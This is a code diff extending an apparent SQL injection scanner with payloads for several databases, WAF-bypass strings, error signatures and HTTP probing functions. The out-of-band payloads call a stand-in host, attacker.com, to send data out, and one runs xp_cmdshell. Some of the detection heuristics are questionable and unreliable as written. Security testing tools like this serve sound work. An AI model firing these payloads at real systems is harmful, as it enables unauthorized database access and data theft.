@@ -53,10 +53,21 @@ SQLI_2026_TECHNIQUES = [
         "name": "Time-Based Blind SQLi",
         "description": "SQLi via conditional time delays",
         "payloads": [
+            # MySQL
             "' OR SLEEP(5)--",
-            "'; WAITFOR DELAY '0:0:5'--",
-            "' OR pg_sleep(5)--",
             "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+            "'; SELECT SLEEP(5);--",
+            "' OR BENCHMARK(10000000,SHA1('test'))--",
+            # MSSQL
+            "'; WAITFOR DELAY '0:0:5'--",
+            "'; EXEC xp_cmdshell('timeout /t 5');--",
+            # PostgreSQL
+            "' OR pg_sleep(5)--",
+            "'; SELECT pg_sleep(5);--",
+            # Oracle
+            "' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
+            # SQLite (no native sleep, use busy loop)
+            "' OR 1=randomblob(500000000)--",
         ],
     },
     {
@@ -68,6 +79,9 @@ SQLI_2026_TECHNIQUES = [
             "' UNION SELECT NULL,NULL--",
             "' UNION SELECT NULL,NULL,NULL--",
             "' UNION ALL SELECT NULL,NULL,NULL--",
+            "1 UNION SELECT NULL--",
+            "0 UNION SELECT 1,2,3--",
+            "-1 UNION SELECT NULL,NULL,NULL,NULL,NULL--",
         ],
     },
     {
@@ -75,9 +89,17 @@ SQLI_2026_TECHNIQUES = [
         "name": "Error-Based SQLi",
         "description": "SQLi via database error messages",
         "payloads": [
+            # MySQL
             "' AND 1=CONVERT(int,(SELECT @@version))--",
             "' AND 1=extractvalue(1,concat(0x7e,(SELECT version())))--",
-            "' AND 1=(SELECT 1 FROM dual WHERE 1=1)--",
+            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+            # MSSQL
+            "' AND 1=CONVERT(int,@@version)--",
+            "';DECLARE @v INT;SELECT @v=CONVERT(int,@@version)--",
+            # PostgreSQL
+            "' AND 1=CAST((SELECT version()) AS int)--",
+            # Oracle
+            "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--",
         ],
     },
     {
@@ -90,8 +112,81 @@ SQLI_2026_TECHNIQUES = [
             "%27%20OR%201%3D1--",
             "' OR '1'='1' LIMIT 1--",
             "1' /*!50000UNION*/ /*!50000SELECT*/ NULL--",
+            "' uNiOn SeLeCt NULL--",
+            "'%20OR%201=1--",
+            "' OR 1=1#",
+            "admin'--",
+            "' OR ''='",
         ],
     },
+    {
+        "id": "stacked_queries",
+        "name": "Stacked Queries SQLi",
+        "description": "SQLi via multiple SQL statements",
+        "payloads": [
+            "'; SELECT 1;--",
+            "'; SELECT @@version;--",
+            "'; SELECT table_name FROM information_schema.tables;--",
+        ],
+    },
+    {
+        "id": "out_of_band",
+        "name": "Out-of-Band SQLi",
+        "description": "SQLi via external network requests",
+        "payloads": [
+            "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',version(),'.attacker.com\\\\share'))--",
+            "'; EXEC master..xp_dirtree '//attacker.com/share'--",
+        ],
+    },
+]
+
+# Database-specific error patterns
+DB_ERROR_PATTERNS = {
+    "mysql": [
+        "mysql_fetch",
+        "mysql_num_rows",
+        "Warning: mysql",
+        "MySqlException",
+        "valid MySQL result",
+        "check the manual that corresponds to your MySQL",
+    ],
+    "mssql": [
+        "Microsoft OLE DB",
+        "ODBC SQL Server",
+        "Unclosed quotation mark",
+        "Microsoft SQL Native Client error",
+        "mssql_query()",
+    ],
+    "postgresql": [
+        "PostgreSQL",
+        "pg_query",
+        "PSQLException",
+        "valid PostgreSQL result",
+        "Npgsql",
+    ],
+    "oracle": [
+        "ORA-",
+        "Oracle error",
+        "OracleException",
+        "quoted string not properly terminated",
+        "OCIStmtExecute",
+    ],
+    "sqlite": [
+        "SQLite/JDBCDriver",
+        "SQLite.Exception",
+        "System.Data.SQLite.SQLiteException",
+        "Warning: sqlite",
+        "Warning: SQLite3",
+    ],
+}
+
+# Column count estimation payloads
+COLUMN_COUNT_PAYLOADS = [
+    "' ORDER BY 1--",
+    "' ORDER BY 10--",
+    "' ORDER BY 100--",
+    "' GROUP BY 1--",
+    "' GROUP BY 10--",
 ]
 
 
@@ -134,6 +229,27 @@ def test_sqli(
         # Test WAF bypass
         if techniques is None or "waf_bypass" in techniques:
             _test_waf_bypass(client, target, param, result)
+        
+        # Test stacked queries
+        if techniques is None or "stacked_queries" in techniques:
+            _test_stacked_queries(client, target, param, result)
+        
+        # Test for second-order SQLi indicators
+        if techniques is None or "second_order" in techniques:
+            _test_second_order_indicators(client, target, param, result)
+        
+        # Detect database type
+        db_type = _detect_database(client, target, param)
+        if db_type:
+            result.findings.append(SQLiFinding(
+                category="sqli",
+                severity="info",
+                title="Database Type Detected",
+                description=f"Target appears to be running {db_type.upper()}",
+                endpoint=target,
+                evidence=f"Detected via error patterns and response analysis",
+                remediation="Ensure database-specific protections are in place",
+            ))
 
     # Save results
     output_file = Path(output_dir) / "sqli_results.json"
@@ -272,6 +388,11 @@ def _test_waf_bypass(client: httpx.Client, target: str, param: str, result: SQLi
         "%27%20OR%201%3D1--",
         "' OR '1'='1' LIMIT 1--",
         "1' /*!50000UNION*/ /*!50000SELECT*/ NULL--",
+        "' uNiOn SeLeCt NULL--",
+        "'%20OR%201=1--",
+        "' OR 1=1#",
+        "admin'--",
+        "' OR ''='",
     ]
     
     base_url = target.rstrip("/")
@@ -308,6 +429,119 @@ def _test_waf_bypass(client: httpx.Client, target: str, param: str, result: SQLi
                     break
         except Exception:
             continue
+
+
+def _test_stacked_queries(client: httpx.Client, target: str, param: str, result: SQLiResult):
+    """Test for stacked queries SQL injection."""
+    logger.info("Testing stacked queries SQLi...")
+    
+    stacked_payloads = [
+        "'; SELECT 1;--",
+        "'; SELECT @@version;--",
+        "'; SELECT table_name FROM information_schema.tables;--",
+        "1; SELECT 1;--",
+        "1; SELECT @@version;--",
+    ]
+    
+    base_url = target.rstrip("/")
+    
+    for payload in stacked_payloads:
+        try:
+            url = f"{base_url}?{param}={payload}"
+            resp = client.get(url)
+            
+            # Check for successful execution (non-error response)
+            if resp.status_code in [200, 301, 302]:
+                # Check for SQL error indicators
+                error_indicators = [
+                    "sql syntax",
+                    "mysql",
+                    "ORA-",
+                    "PostgreSQL",
+                    "SQLite",
+                    "Microsoft OLE DB",
+                ]
+                
+                for indicator in error_indicators:
+                    if indicator.lower() in resp.text.lower():
+                        result.findings.append(SQLiFinding(
+                            category="sqli",
+                            severity="critical",
+                            title="Stacked Queries SQL Injection",
+                            description="Multiple SQL statements can be executed",
+                            endpoint=url,
+                            payload=payload,
+                            remediation="Disable stacked queries, use parameterized queries",
+                        ))
+                        break
+        except Exception:
+            continue
+
+
+def _test_second_order_indicators(client: httpx.Client, target: str, param: str, result: SQLiResult):
+    """Test for second-order SQL injection indicators."""
+    logger.info("Testing for second-order SQLi indicators...")
+    
+    # Common second-order injection points
+    second_order_indicators = [
+        {"path": "/login", "param": "username", "payload": "admin'--"},
+        {"path": "/register", "param": "email", "payload": "test@test.com'--"},
+        {"path": "/profile", "param": "name", "payload": "test'--"},
+        {"path": "/search", "param": "q", "payload": "test'--"},
+    ]
+    
+    base_url = target.rstrip("/")
+    
+    for indicator in second_order_indicators:
+        try:
+            url = f"{base_url}{indicator['path']}"
+            resp = client.get(url, params={indicator['param']: indicator['payload']})
+            
+            # Check if payload appears in response (stored XSS/SQLi indicator)
+            if indicator['payload'] in resp.text:
+                result.findings.append(SQLiFinding(
+                    category="sqli",
+                    severity="medium",
+                    title="Potential Second-Order SQLi",
+                    description=f"Payload appears to be stored without sanitization",
+                    endpoint=url,
+                    payload=indicator['payload'],
+                    remediation="Sanitize all user inputs before storage, use parameterized queries",
+                ))
+        except Exception:
+            continue
+
+
+def _detect_database(client: httpx.Client, target: str, param: str) -> str:
+    """Detect database type through error analysis."""
+    logger.info("Detecting database type...")
+    
+    # Payloads that trigger database-specific errors
+    detection_payloads = [
+        "'",
+        "' OR '1'='1",
+        "1' AND '1'='1",
+        "1 AND 1=1",
+    ]
+    
+    base_url = target.rstrip("/")
+    
+    for payload in detection_payloads:
+        try:
+            url = f"{base_url}?{param}={payload}"
+            resp = client.get(url)
+            
+            text_lower = resp.text.lower()
+            
+            # Check for database-specific patterns
+            for db, patterns in DB_ERROR_PATTERNS.items():
+                for pattern in patterns:
+                    if pattern.lower() in text_lower:
+                        return db
+        except Exception:
+            continue
+    
+    return None
 
 
 def _save_results(result: SQLiResult, output_file: Path):
